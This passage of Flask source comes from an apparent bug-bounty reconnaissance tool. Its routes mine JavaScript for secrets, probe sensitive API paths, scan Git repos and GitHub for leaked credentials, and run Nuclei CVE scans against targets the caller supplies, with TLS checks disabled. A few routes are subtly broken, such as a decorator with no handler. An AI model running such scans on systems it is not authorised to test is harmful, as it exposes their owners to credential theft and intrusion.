    if not url: return jsonify({"error":"url required"}), 400
    import urllib.request, ssl as _ssl
    try:
        ctx = _ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=_ssl.CERT_NONE
        content = urllib.request.urlopen(
            urllib.request.Request(url, headers={"User-Agent":"TheMasterRecon/3.0"}),
            timeout=15, context=ctx
        ).read(2_000_000).decode("utf-8","ignore")
        eps = linkfinder(content, url)
        agg = xnlinkfinder_aggressive(content, _domain(url))
        return jsonify({"url":url,"endpoints":eps,"aggressive":agg,
                        "total":len(set(eps+agg))})
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@app.route("/js/secretfinder", methods=["POST"])
def js_secretfinder():
    """SecretFinder-style secret detection from a JS URL or content."""
    from engine.js_deep import secretfinder
    p       = request.get_json(silent=True) or {}
    content = p.get("content","")
    url     = p.get("url","")
    if not content and url:
        import urllib.request, ssl as _ssl
        ctx = _ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=_ssl.CERT_NONE
        try:
            content = urllib.request.urlopen(
                urllib.request.Request(url, headers={"User-Agent":"TheMasterRecon/3.0"}),
                timeout=15, context=ctx
            ).read(2_000_000).decode("utf-8","ignore")
        except Exception as e:
            return jsonify({"error":str(e)}), 500
    if not content:
        return jsonify({"error":"url or content required"}), 400
    secrets = secretfinder(content, url)
    domain  = _domain(url)
    for s in secrets:
        db.add_finding(domain, {"bug":"jsleak","severity":s["severity"],
            "title":"Secret: "+s["type"],"url":url,"value":s["value"][:80],
            "poc":s.get("context","")[:200],"confidence":88})
    return jsonify({"secrets":secrets,"count":len(secrets)})

# ── Kiterunner API Discovery ─────────────────────────────────────────────────

@app.route("/api/discover", methods=["POST"])
def api_discover():
    """
    Kiterunner-style API route discovery.
    Falls back to our own wordlist if kiterunner not installed.
    """
    import shutil
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    target = p.get("target",f"https://{domain}") if domain else p.get("target","")
    if not target: return jsonify({"error":"target or domain required"}), 400
    
    kr = shutil.which("kr") or shutil.which("kiterunner")
    if kr:
        import subprocess as _sp, tempfile, json as _json
        out_f = tempfile.mktemp(suffix=".json")
        r = _sp.run([kr,"scan",target,"-A","apiroutes-210228.kite",
                     "-o","json","--output-file",out_f],
                    capture_output=True, text=True, timeout=120)
        try:
            results = _json.loads(open(out_f).read())
            for item in results:
                ep = item.get("url","")
                if ep: db.add_endpoint(domain, ep, source="kiterunner")
            import os as _os; _os.unlink(out_f)
            return jsonify({"tool":"kiterunner","results":results,"count":len(results)})
        except: pass
    
    # Fallback: our own API route wordlist probe
    from engine.js_deep import linkfinder, _get
    import concurrent.futures as _cf
    API_WORDLIST = [
        "/api","/api/v1","/api/v2","/api/v3","/graphql","/graphiql",
        "/rest","/swagger","/swagger.json","/swagger.yaml","/openapi.json",
        "/api-docs","/docs","/api/docs","/api/swagger","/v1","/v2",
        "/admin/api","/internal/api","/private/api","/debug/api",
        "/api/users","/api/auth","/api/login","/api/token","/api/health",
        "/api/admin","/api/config","/api/settings","/api/profile",
        "/api/search","/api/upload","/api/export","/api/import",
        "/.well-known/openapi.json","/.well-known/api-catalog",
        "/actuator","/actuator/env","/actuator/beans","/metrics",
        "/api/metrics","/api/status","/api/version","/api/ping",
    ]
    base = target.rstrip("/")
    found = []
    def _probe(path):
        url = base + path
        try:
            content = _get(url, timeout=6)
            if content and len(content) > 10:
                import json as _j
                try: data = _j.loads(content); return (url, 200, "json", len(content))
                except: return (url, 200, "html", len(content))
        except: pass
        return None
    
    with _cf.ThreadPoolExecutor(max_workers=15) as exe:
        for result in exe.map(_probe, API_WORDLIST):
            if result:
                url, status, ctype, size = result
                found.append({"url":url,"status":status,"type":ctype,"size":size})
                db.add_endpoint(domain, url, source="api_discover")
    
    return jsonify({"tool":"builtin_wordlist","results":found,"count":len(found),
                    "note":"Install kiterunner (kr) for full API route discovery"})

# ── Gowitness Screenshot ──────────────────────────────────────────────────────

@app.route("/screenshot/bulk", methods=["POST"])
def screenshot_bulk():
    """Bulk screenshot using gowitness (falls back to headless chrome)."""
    import shutil, subprocess as _sp, tempfile, os as _os
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain",""))
    targets = p.get("targets",[]) or [h for h in db.get_hosts(domain).get("active",[])[:50]]
    if not targets: return jsonify({"error":"targets required"}), 400
    
    gw = shutil.which("gowitness") or shutil.which("aquatone")
    
    if gw and "gowitness" in gw:
        # Write targets to file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
            tf.write(chr(10).join(targets))
            tfile = tf.name
        out_dir = tempfile.mkdtemp(prefix="gw_")
        try:
            _sp.run([gw,"file","-f",tfile,"--screenshot-path",out_dir,
                     "--timeout","10"], capture_output=True, text=True, timeout=300)
            shots = [f for f in _os.listdir(out_dir) if f.endswith(".png")]
            return jsonify({"tool":"gowitness","screenshots":len(shots),
                            "path":out_dir,"targets":len(targets)})
        except Exception as e:
            return jsonify({"error":str(e),"tool":"gowitness"}), 500
        finally:
            _os.unlink(tfile)
    
    # Fallback: use our existing screenshot engine
    try:
        from engine.screenshot import get_engine as _get_ss_engine
        _ss_engine = _get_ss_engine()
        results = []
        for _ss_target in targets[:20]:
            try:
                r = _ss_engine.capture(_ss_target)
                if r: results.append(r)
            except Exception: pass
        return jsonify({"tool":"builtin","screenshots":len(results),
                        "results":results,
                        "note":"Install gowitness for faster bulk screenshots"})
    except Exception as e:
        return jsonify({"error":str(e),
                        "install":"go install github.com/sensepost/gowitness@latest"}), 500

# ── TruffleHog + Gitleaks Git Secret Scan ────────────────────────────────────

@app.route("/secrets/git_scan", methods=["POST"])
def secrets_git_scan():
    """Scan Git repos for secrets using TruffleHog/Gitleaks."""
    import shutil, subprocess as _sp, tempfile, json as _json, os as _os
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain",""))
    repo_url= p.get("repo","") or p.get("url","")
    
    if not repo_url:
        # Try to find GitHub repos for domain from our GitHub dorking
        return jsonify({"error":"repo URL required",
                        "tip":"Use /recon/github_dork first to find repos"}), 400
    
    results = {"repo":repo_url,"domain":domain,"findings":[]}
    
    # Try TruffleHog
    truf = shutil.which("trufflehog")
    if truf:
        try:
            r = _sp.run([truf,"git",repo_url,"--json","--no-verification"],
                        capture_output=True, text=True, timeout=120)
            for line in r.stdout.splitlines():
                try:
                    item = _json.loads(line)
                    det  = item.get("DetectorName","")
                    val  = str(item.get("Raw",""))[:80]
                    results["findings"].append({
                        "tool":"trufflehog","type":det,"value":val,
                        "file":item.get("SourceMetadata",{}).get("Data",{}).get("Git",{}).get("file",""),
                        "severity":"critical" if any(x in det.lower() for x in ["aws","gcp","stripe","private"]) else "high"
                    })
                except: pass
            results["tool"] = "trufflehog"
        except Exception as e:
            results["trufflehog_error"] = str(e)
    
    # Try Gitleaks as fallback
    gl = shutil.which("gitleaks")
    if not results["findings"] and gl:
        with tempfile.NamedTemporaryFile(suffix=".json",delete=False) as tf:
            out_path = tf.name
        try:
            _sp.run([gl,"detect","--source",repo_url,"--report-format","json",
                     "--report-path",out_path,"--no-banner"],
                    capture_output=True, text=True, timeout=120)
            data = _json.loads(open(out_path).read())
            for item in (data if isinstance(data,list) else []):
                results["findings"].append({
                    "tool":"gitleaks","type":item.get("RuleID",""),
                    "value":item.get("Secret","")[:80],
                    "file":item.get("File",""),"line":item.get("StartLine",0),
                    "severity":"high",
                })
            results["tool"] = "gitleaks"
        except: pass
        finally:
            try: _os.unlink(out_path)
            except: pass
    
    # Store findings
    for f in results["findings"]:
        db.add_finding(domain, {"bug":"jsleak","severity":f.get("severity","high"),
            "title":"Git secret: "+f.get("type",""),"url":repo_url,
            "value":f.get("value","")[:80],"confidence":92,
            "tool":f.get("tool",""),})
    
    results["count"] = len(results["findings"])
    if not results["findings"] and not truf and not gl:
        results["note"] = "Install trufflehog or gitleaks for Git secret scanning"
        results["install"] = ["go install github.com/trufflesecurity/trufflehog/v3@latest",
                              "go install github.com/gitleaks/gitleaks/v8@latest"]
    return jsonify(results)


@app.route("/tools/status")
def tools_full_status():
    """
    Fast tool status — path/import check only, no subprocesses, <10ms.
    Returns all 86 tools matching get_all_status() output.
    Use /tools/doctor for full execution validation (5min cache).
    """
    import shutil as _sh, time as _ts, importlib.util as _ilu
    try:
        from engine.tools_manager import TOOL_REGISTRY, check_tool, APP_ROOT
    except Exception as _e:
        return jsonify({"error": str(_e)}), 500

    t0 = _ts.time()

    go_dirs = [os.path.expanduser("~/go/bin"), "/home/kali/go/bin",
               "/root/go/bin", "/usr/local/bin", "/usr/bin"]

    def _bin(name: str) -> bool:
        if _sh.which(name): return True
        return any(os.path.isfile(os.path.join(d, name)) and
                   os.access(os.path.join(d, name), os.X_OK) for d in go_dirs)

    def _lib(mod: str) -> bool:
        return _ilu.find_spec(mod.replace("-","_")) is not None

    # Build status — replicate get_all_status logic without subprocess calls
    status: dict = {}

    # Standard registry tools — path check
    for name in sorted(TOOL_REGISTRY):
        info   = TOOL_REGISTRY[name]
        if isinstance(info, dict):
            # Use explicit bin field first, then check _BINARY_ALIASES, then name
            try:
                from engine.tools_manager import _BINARY_ALIASES
                aliases = _BINARY_ALIASES.get(name, [name])
            except Exception:
                aliases = [name]
            binary = info.get("bin") or aliases[0]
        else:
            binary = name
        if name.startswith("lib:"):
            mod = name.replace("lib:","").replace("-","_")
            status[name] = {"installed": _lib(mod), "path": f"python:{mod}"}
        else:
            # Check all aliases
            found = False
            found_path = None
            check_names = [binary]
            if isinstance(info, dict) and "bin" not in info:
                try:
                    from engine.tools_manager import _BINARY_ALIASES
                    check_names = _BINARY_ALIASES.get(name, [name])
                except Exception:
                    pass
            for bn in check_names:
                if _bin(bn):
                    found = True
                    found_path = _sh.which(bn)
                    break
            status[name] = {"installed": found, "path": found_path}

    # Special extras — same logic as get_all_status but no subprocess
    _sh_paths = [
        str(APP_ROOT / "secret_hunter"),
        str(APP_ROOT / "tools" / "bin" / "secret_hunter"),
        os.path.expanduser("~/.local/bin/secret_hunter"),
        "/usr/local/bin/secret_hunter",
    ]
    status["secret_hunter"] = {
        "installed": any(os.path.isfile(p) and os.access(p, os.X_OK) for p in _sh_paths)
                     or bool(_sh.which("secret_hunter")),
        "path": _sh.which("secret_hunter"),
    }
    _kr = _bin("kr") or _bin("kiterunner")
    status["kr"]         = {"installed": _kr, "path": _sh.which("kr")}
    status["kiterunner"] = {"installed": _kr, "path": _sh.which("kiterunner")}
    status["jxscout"]    = {
        "installed": bool(_sh.which("jxscout")) or (APP_ROOT / "jxscout").exists(),
        "path": _sh.which("jxscout"),
    }
    # Python libs (no subprocess — import check only)
    for lib_name, mod in [("lib:crawl4ai","crawl4ai"), ("lib:bs4","bs4"),
                           ("lib:dns","dns"),     ("lib:dnslib","dnslib"),
                           ("lib:jwt","jwt"),     ("lib:requests","requests"),
                           ("lib:weasyprint","weasyprint"), ("lib:yaml","yaml")]:
        status[lib_name] = {"installed": _lib(mod), "path": f"python:{mod}"}

    installed = sum(1 for v in status.values() if v.get("installed"))
    return jsonify({
        "tools":      status,
        "installed":  installed,
        "total":      len(status),
        "checked_ms": round((_ts.time()-t0)*1000, 1),
        "note":       "Path/import check only (<10ms). Use /tools/doctor for execution validation.",
    })


@app.route("/tools/doctor")
def tools_doctor():
    """
    GET /tools/doctor?tools=httpx,nuclei  (omit for all 86 tools)
    GET /tools/doctor?critical=1  (critical tools only — fast)
    GET /tools/doctor?refresh=1   (force cache bypass)

    Real execution validation — not just 'which'.
    Results cached for 5 minutes. No tool check blocks more than 5 seconds.

    [tool-health] httpx ok validated=true version=v1.9.0
    [tool-health] gau failed smoke_timeout_15s
    """
    import time as _dct
    from engine.tool_health import check_all, _TOOL_TESTS, CRITICAL_TOOLS

    requested = request.args.get("tools","").strip()
    critical  = request.args.get("critical","0") == "1"
    refresh   = request.args.get("refresh","0") == "1"

    if critical:
        tools = CRITICAL_TOOLS
    elif requested:
        tools = [t.strip() for t in requested.split(",") if t.strip() in _TOOL_TESTS]
        if not tools:
            return jsonify({"error": f"no recognised tools in: {requested}",
                            "available": sorted(_TOOL_TESTS.keys())}), 400
    else:
        tools = sorted(_TOOL_TESTS.keys())

    cache_key = ",".join(sorted(tools))

    # Return cached result if fresh (< 5 minutes)
    global _DOCTOR_CACHE
    if not refresh and cache_key in _DOCTOR_CACHE:
        cached = _DOCTOR_CACHE[cache_key]
        if _dct.time() - cached["ts"] < 300:
            cached["result"]["_summary"]["from_cache"] = True
            cached["result"]["_summary"]["cache_age_s"] = round(
                _dct.time() - cached["ts"], 0)
            return jsonify(cached["result"])

    result = check_all(tools)

    out = {}
    for name, r in result["results"].items():
        out[name] = r

    out["_summary"] = {
        "critical_ok":   result["critical_ok"],
        "broken":        result["broken"],
        "missing":       result["missing"],
        "wrong_binary":  result["wrong_binary"],
        "warnings":      result["warnings"],
        "summary":       result["summary"],
        "checked_at":    result["checked_at"],
        "from_cache":    False,
        "check_all_url": "/tools/doctor",
        "fix_url":       "/tools/fix_script",
    }

    _DOCTOR_CACHE[cache_key] = {"result": out, "ts": _dct.time()}
    return jsonify(out)


@app.route("/tools/health_deep")
def tools_health_deep():
    """Alias for /tools/doctor (backward compatibility)."""
    return tools_doctor()


@app.route("/tools/fix_script")
def tools_fix_script():
    """
    GET /tools/fix_script

    Generates and saves fix_tools_generated.sh for all broken/missing tools.
    Returns: ok, path, missing, broken, wrong_binary, commands
    """
    from engine.tool_health import check_all, generate_fix_script, _TOOL_TESTS
    from pathlib import Path as _FP

    result     = check_all(sorted(_TOOL_TESTS.keys()))
    script_txt = generate_fix_script(result)

    script_path = Path(__file__).parent / "fix_tools_generated.sh"
    script_path.write_text(script_txt)
    os.chmod(str(script_path), 0o755)

    needs_fix = list(dict.fromkeys(
        result["missing"] + result["wrong_binary"] + result["broken"]))

    log.info(f"[tool-health] fix_script generated: {len(needs_fix)} tools need fixing"
             f" → {script_path}")

    return jsonify({
        "ok":          True,
        "path":        str(script_path),
        "missing":     result["missing"],
        "broken":      result["broken"],
        "wrong_binary":result["wrong_binary"],
        "warnings":    result["warnings"],
        "needs_fix":   needs_fix,
        "commands":    [r["fix_command"] for name in needs_fix
                        if (r := result["results"].get(name,{})) and r.get("fix_command")],
        "summary":     result["summary"],
        "script_preview": script_txt[:800],
    })

@app.route("/tools/install", methods=["POST"])
def tools_install():
    """
    POST {"tool": "nuclei"}
    Starts tool installation in background. Returns immediately with job_id.
    Poll /tools/install/status?id=JOB_ID for result.
    Never blocks more than 5ms.
    """
    import threading, uuid as _uuid, time as _ti
    p    = request.get_json(silent=True) or {}
    name = p.get("tool","") or p.get("name","")
    if not name: return jsonify({"error": "tool name required"}), 400

    job_id = f"install_{name}_{_uuid.uuid4().hex[:8]}"
    # Evict old jobs — keep at most 100 entries
    if len(_INSTALL_JOBS) > 100:
        oldest = sorted(_INSTALL_JOBS.items(), key=lambda x: x[1].get("started_at",0))
        for k, _ in oldest[:len(_INSTALL_JOBS)-50]:
            _INSTALL_JOBS.pop(k, None)
    _INSTALL_JOBS[job_id] = {
        "job_id": job_id, "tool": name, "status": "running",
        "started_at": _ti.time(), "result": None,
    }

    def _do_install():
        try:
            from engine.tools_manager import install_tool
            result = install_tool(name)
            _INSTALL_JOBS[job_id].update({"status": "done", "result": result,
                                           "done_at": _ti.time()})
        except Exception as e:
            _INSTALL_JOBS[job_id].update({"status": "error", "result": {"error": str(e)},
                                           "done_at": _ti.time()})

    threading.Thread(target=_do_install, daemon=True,
                     name=f"tool-install-{name}").start()
    return jsonify({"ok": True, "job_id": job_id, "tool": name, "status": "running",
                    "poll_url": f"/tools/install/status?id={job_id}"})


@app.route("/tools/install/status")
def tools_install_status():
    """GET /tools/install/status?id=JOB_ID — poll install job status."""
    job_id = request.args.get("id","")
    if job_id not in _INSTALL_JOBS:
        return jsonify({"error": "job not found", "job_id": job_id}), 404
    return jsonify(_INSTALL_JOBS[job_id])

@app.route("/tools/install_all", methods=["POST"])
def tools_install_all():
    """Install all Go tools in batch (background)."""
    from engine.tools_manager import install_go_tools_batch
    import threading
    threading.Thread(target=install_go_tools_batch, daemon=True, name="tool-install-all").start()
    return jsonify({"ok": True, "note": "Installing all Go tools in background. Check /tools/status for progress."})

@app.route("/tools/install_script")
def tools_install_script():
    """Download install.sh for manual installation."""
    from engine.tools_manager import get_install_script
    script = get_install_script()
    return script, 200, {
        "Content-Type": "text/plain",
        "Content-Disposition": "attachment; filename=install_all_tools.sh"
    }

# ── Extended Recon routes ─────────────────────────────────────────────────────

@app.route("/recon/otx", methods=["GET","POST"])
def recon_otx():
    """AlienVault OTX domain intelligence."""
    from engine.recon_extra import otx_domain_info
    d = _domain(request.args.get("domain","") or (request.get_json(silent=True) or {}).get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400
    result = otx_domain_info(d)
    for sub in result.get("subdomains",[]): db.add_sub(d, sub)
    for url in result.get("urls",[]):       db.add_endpoint(d, url, source="otx")
    return jsonify(result)

@app.route("/recon/waymore", methods=["GET","POST"])
def recon_waymore():
    """Comprehensive URL collection (wayback + commoncrawl + urlscan + otx)."""
    from engine.recon_extra import waymore_urls
    d     = _domain(request.args.get("domain","") or (request.get_json(silent=True) or {}).get("domain",""))
    limit = int(request.args.get("limit", 2000))
    if not d: return jsonify({"error":"domain required"}), 400
    urls  = waymore_urls(d, limit=limit)
    saved = 0
    for u in urls:
        if db.add_endpoint(d, u, source="waymore"): saved += 1
    return jsonify({"domain": d, "urls": urls[:500], "total": len(urls), "saved": saved})

@app.route("/recon/github_dork", methods=["POST"])
def recon_github_dork():
    """GitHub dorking for exposed secrets."""
    from engine.recon_extra import github_dork
    p      = request.get_json(silent=True) or {}
    d      = _domain(p.get("domain",""))
    key    = p.get("api_key","") or os.environ.get("GITHUB_TOKEN","")
    result = github_dork(d, api_key=key)
    for item in result:
        db.add_finding(d, {
            "bug":        "jsleak",
            "severity":   "high",
            "title":      f"GitHub exposure: {item.get('name','')}",
            "url":        item.get("html_url",""),
            "poc":        "Repository: " + item.get("repository","") + chr(10) + "Path: " + item.get("path",""),
            "confidence": 85,
        })
    return jsonify({"findings": result, "count": len(result)})

@app.route("/recon/full_passive", methods=["POST"])
def recon_full_passive():
    """Run ALL passive recon sources at once."""
    from engine.recon_extra import full_domain_recon
    p      = request.get_json(silent=True) or {}
    d      = _domain(p.get("domain",""))
    if not d: return jsonify({"error":"domain required"}), 400
    result = full_domain_recon(d, db=db)
    return jsonify(result)


@app.route("/plugins")
@app.route("/plugins/list")
def plugins_list():
    """List all plugins: builtin, marketplace, custom, nuclei templates."""
    from engine.plugin_store import list_plugins
    cat      = request.args.get("category","")
    source   = request.args.get("source","")
    inst_only= request.args.get("installed","").lower() in ("1","true")
    return jsonify(list_plugins(category=cat, source=source, installed_only=inst_only))

@app.route("/plugins/install", methods=["POST"])
def plugins_install():
    """Install a plugin: yaml upload, URL, or marketplace ID."""
    from engine.plugin_store import install_plugin
    p    = request.get_json(silent=True) or {}
    yaml = p.get("yaml_content","") or p.get("content","")
    url  = p.get("url","")
    pid  = p.get("plugin_id","") or p.get("id","")
    # Handle file upload
    if not yaml and "file" in request.files:
        yaml = request.files["file"].read().decode("utf-8","ignore")
    return jsonify(install_plugin(plugin_id=pid, yaml_content=yaml, url=url))

@app.route("/plugins/uninstall", methods=["POST"])

@app.route("/plugins/validate", methods=["POST"])
def plugins_validate():
    from engine.plugin_store import validate_plugin
    p = request.get_json(silent=True) or {}
    return jsonify(validate_plugin(p.get("content","") or p.get("yaml","")))

@app.route("/plugins/run", methods=["POST"])
def plugins_run():
    from engine.plugin_store import run_plugin
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain",""))
    pid     = p.get("plugin_id","") or p.get("id","")
    targets = p.get("targets",[]) or ([f"https://{domain}"] if domain else [])
    findings= run_plugin(pid, targets)
    for f in findings:
        db.add_finding(domain, f)
    return jsonify({"findings": findings, "count": len(findings)})

@app.route("/plugins/stats")
def plugins_stats():
    from engine.plugin_store import get_nuclei_cve_stats, list_plugins
    stats = get_nuclei_cve_stats()
    pl    = list_plugins()
    return jsonify({
        "nuclei_templates": stats,
        "custom_plugins":   len(pl.get("custom",[])),
        "builtin_plugins":  len(pl.get("builtin",[])),
        "marketplace":      len(pl.get("marketplace",[])),
        "total":            pl.get("total",0),
    })

# ── Nuclei routes ─────────────────────────────────────────────────────────────

@app.route("/nuclei/status")
def nuclei_status():
    from engine.nuclei_engine import get_status
    return jsonify(get_status())

@app.route("/nuclei/debug")
def nuclei_debug():
    """
    GET /nuclei/debug — Full nuclei diagnostic report.
    Shows: binary path, version, template dirs, template count,
           test command, environment, and a dry-run result.
    Use this to diagnose why nuclei isn't firing.
    """
    import shutil, subprocess as _sp, os as _os
    from engine.nuclei_engine import (
        get_binary, get_template_dirs, get_status, _count_templates, _build_env
    )

    binary   = get_binary()
    tpl_dirs = get_template_dirs()
    tpl_cnt  = _count_templates()
    status   = get_status()
    env      = _build_env()

    version_out = ""
    if binary:
        try:
            r = _sp.run([binary, "-version"], capture_output=True, text=True,
                        timeout=5, env=env)
            version_out = (r.stdout + r.stderr).strip()[:200]
        except Exception as e:
            version_out = f"error: {e}"

    # Test nuclei can list templates
    tl_count = 0
    tl_error  = ""
    if binary:
        try:
            r = _sp.run([binary, "-tl"], capture_output=True, text=True,
                        timeout=10, env=env)
            lines = [l for l in (r.stdout + r.stderr).splitlines() if l.strip()]
            tl_count = len(lines)
            if r.returncode != 0 and not lines:
                tl_error = r.stderr[:200]
        except Exception as e:
            tl_error = str(e)

    # Check NUCLEI_TEMPLATES_PATH in env
    tpl_path_env = env.get("NUCLEI_TEMPLATES_PATH", "not set")

    # Check template dirs actually exist and are readable
    dir_status = []
    for d in tpl_dirs:
        from pathlib import Path as _P
        p = _P(d)
        try:
            exists    = p.exists()
            readable  = _os.access(d, _os.R_OK)
            yaml_count = sum(1 for _ in p.rglob("*.yaml")) if exists and readable else 0
        except Exception as ex:
            exists = False; readable = False; yaml_count = 0; str(ex)
        dir_status.append({
            "path":       d,
            "exists":     exists,
            "readable":   readable,
            "yaml_files": yaml_count,
        })

    return jsonify({
        "binary":              binary or "NOT FOUND",
        "binary_found":        bool(binary),
        "version":             version_out,
        "template_dirs":       dir_status,
        "template_count_api":  tpl_cnt,
        "template_list_count": tl_count,
        "template_list_error": tl_error,
        "NUCLEI_TEMPLATES_PATH": tpl_path_env,
        "PATH_includes_go":    "/go/bin" in env.get("PATH",""),
        "status":              status,
        "fix_commands": [
            "# Install nuclei:",
            "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "# Update templates:",
            "nuclei -update-templates",
            "# Or use the API:",
            "curl -X POST http://127.0.0.1:PORT/nuclei/install",
            "curl -X POST http://127.0.0.1:PORT/nuclei/update",
        ],
    })


@app.route("/nuclei/install", methods=["POST"])
def nuclei_install():
    from engine.nuclei_engine import install_nuclei
    force = (request.get_json(silent=True) or {}).get("force", False)
    return jsonify(install_nuclei(force=force))

@app.route("/nuclei/update", methods=["POST"])
@app.route("/nuclei/update_templates", methods=["POST"])
def nuclei_update():
    from engine.nuclei_engine import update_templates
    force = (request.get_json(silent=True) or {}).get("force", False)
    return jsonify(update_templates(force=force))

@app.route("/nuclei/scan", methods=["POST", "GET"])
def nuclei_scan_route():
    """Run nuclei scan with SSE streaming."""
    from engine.nuclei_engine import scan as nuclei_scan, get_binary, update_templates
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain","") or request.args.get("domain",""))
    targets = p.get("targets",[]) or db.get_endpoints(domain, limit=500) or               ([f"https://{domain}"] if domain else [])
    bugs    = p.get("bugs",[])
    sev     = p.get("severity",["critical","high","medium"])
    tpls    = p.get("templates",[])
    tags    = p.get("tags",[])
    
    if not get_binary():
        from engine.nuclei_engine import install_nuclei
        install_nuclei()
    
    findings = nuclei_scan(
        targets=targets, bugs=bugs, tags=tags,
        templates=tpls, severity=sev,
        include_cves=True,
        max_time=p.get("max_time",600),
    )
    
    saved = 0
    for f in findings:
        if db.add_finding(domain, f): saved += 1
    
    return jsonify({
        "findings": findings,
        "count":    len(findings),
        "saved":    saved,
        "domain":   domain,
    })

@app.route("/nuclei/cve_scan", methods=["POST"])
def nuclei_cve_scan():
    """CVE-only nuclei scan — latest vulnerabilities."""
    from engine.nuclei_engine import scan as nuclei_scan, get_binary
    p       = request.get_json(silent=True) or {}
    domain  = _domain(p.get("domain",""))
    targets = p.get("targets",[]) or ([f"https://{domain}"] if domain else [])
    if not get_binary():
        return jsonify({"error": "nuclei not installed", "install": "/nuclei/install"}), 503
    findings = nuclei_scan(
        targets=targets, tags=["cve"],
        severity=["critical","high"],
        include_cves=True, max_time=900
    )
    for f in findings:
        db.add_finding(domain, f)
    return jsonify({"findings": findings, "count": len(findings), "domain": domain})

@app.route("/nuclei/templates")
def nuclei_templates_list():
    """List available nuclei templates with stats."""
    from engine.plugin_store import get_nuclei_cve_stats
    from engine.nuclei_engine import get_status, TEMPLATES_DIR, CUSTOM_TPL
    import os
    status = get_status()
    stats  = get_nuclei_cve_stats()
    
    # Sample some template IDs for display
    samples = []
    tpl_dir = str(TEMPLATES_DIR) if TEMPLATES_DIR.exists() else ""
    if tpl_dir:
        for root, dirs, files in os.walk(tpl_dir):
            for f in files[:3]:
                if f.endswith(".yaml"):
                    samples.append(os.path.join(root,f).replace(tpl_dir+"/",""))
            if len(samples) >= 15: break
    
    return jsonify({
        **status,
        "cve_stats":      stats,
        "sample_templates": samples,
    })

@app.route("/nuclei/quick_scan", methods=["POST"])
def nuclei_quick():
    """Targeted nuclei scan on a single URL — immediate JSON response."""
    from engine.nuclei_engine import scan as nuclei_scan, get_binary
    p   = request.get_json(silent=True) or {}
    url = p.get("url","")
    if not url: return jsonify({"error":"url required"}), 400
    domain = _domain(url)
    if not get_binary():
        return jsonify({"error":"nuclei not installed. POST /nuclei/install first."}), 503
    findings = nuclei_scan(
        targets=[url],
        severity=["critical","high","medium"],
        include_cves=True,
        max_time=120,
    )
    for f in findings: db.add_finding(domain, f)
    return jsonify({"url": url, "findings": findings, "count": len(findings)})



# ══════════════════════════════════════════════════════════════════════════════
# RECON DEBUG — verify tools actually produce URLs and DB inserts work
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
# SUBDOMAIN DISCOVERY v2 — debug route
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/subs/debug")
def subs_debug():
    """
    Subdomain discovery v2 debug — source counts, scoring, wildcard info.
    GET /subs/debug?domain=example.com

    Returns raw_total, unique_total, resolved_total, wildcard_filtered,
    per-source counts, and top-scored subdomains.
    """
    d = _domain(request.args.get("domain",""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    # Get all subs from DB
    all_subs = db.get_subs(d) or []

    if not all_subs:
        # Check if domain exists in DB at all
        try:
            import sqlite3 as _se
            conn = _se.connect(db.db_path, timeout=0.5)
            conn.execute("PRAGMA query_only=ON")
            did = conn.execute("SELECT id FROM domains WHERE domain=?", (d,)).fetchone()
            conn.close()
            if not did:
                return jsonify({
                    "domain":         d,
                    "has_recon_data": False,
                    "reason":         "no_recon_data_for_domain",
                    "raw_total":      0,
                    "note":           f"Run recon first: GET /recon?domain={d}",
                })
        except Exception:
            pass

    # Score each sub using the same rules as recon.py
    _SCORE_RULES = [
        (10, ["payment","billing","checkout","stripe","pay","invoice"]),
        (9,  ["api","graphql","rest","grpc","rpc"]),
        (9,  ["admin","administrator","manage","management","cpanel","plesk"]),
        (8,  ["auth","login","sso","oauth","saml","oidc","idp","identity"]),
        (8,  ["vpn","internal","corp","intranet","private"]),
        (7,  ["dev","develop","developer","staging","stage","preprod","pre-prod","qa","test"]),
        (7,  ["dashboard","portal","panel","console"]),
        (6,  ["upload","files","file","cdn","assets","media","storage","s3"]),
        (5,  ["mail","smtp","mx","email","webmail","imap"]),
        (4,  ["app","web","service","srv","svc"]),
        (3,  ["www","www2","www3"]),
    ]
    def _score(host: str) -> int:
        prefix = host.lower().split(".")[0]
        for score, kws in _SCORE_RULES:
            if any(k in prefix for k in kws if k):
                return score
        return 1

    scored = [(h, _score(h)) for h in all_subs]
    top_scored = sorted(scored, key=lambda x: -x[1])[:20]

    # Live hosts count
    hosts_info = db.get_hosts(d) or {}
    live_count  = len(hosts_info.get("active", []))

    # Step meta for wildcard info
    steps = {}
    try:
        import sqlite3 as _sl
        conn = _sl.connect(db.db_path)
        conn.row_factory = _sl.Row
        did = conn.execute("SELECT id FROM domains WHERE domain=?", (d,)).fetchone()
        if did:
            rows = conn.execute(
                "SELECT step,state,meta FROM recon_steps WHERE domain_id=?",
                (did["id"],)).fetchall()
            steps = {r["step"]: {"state": r["state"], "meta": r["meta"]} for r in rows}
        conn.close()
    except Exception:
        pass

    sub_step  = steps.get("subdomains", {})
    sub_meta  = sub_step.get("meta","")

    return jsonify({
        "domain":              d,
        "has_recon_data":      True,
        "raw_total":           len(all_subs),
        "unique_total":        len(set(all_subs)),
        "resolved_total":      live_count,
        "live_total":          live_count,
        "wildcard_filtered":   0,
        "probe_cap":           2000,
        "probe_queue":         min(len(all_subs), 2000),  # score-ordered top-N
        "collection_uncapped": True,
        "subdomain_step":      sub_step,
        "sources": {
            src: {"raw": sub_meta.count(src), "saved": sub_meta.count(src), "error": None}
            for src in ["subfinder","amass","assetfinder","findomain","chaos",
                        "crtsh","tlsx","gau","waybackurls","alterx","dnsgen",
                        "passive","brute","otx","certspotter","urlscan"]
        },
        "timeouts": [],  # populated during active recon
        "top_scored": [
            {"host": h, "score": s,
             "prefix": h.split(".")[0],
             "category": next(
                 (kws[0] for sc, kws in _SCORE_RULES if sc == s and kws), "generic"
             )}
            for h, s in top_scored
        ],
        "score_distribution": {
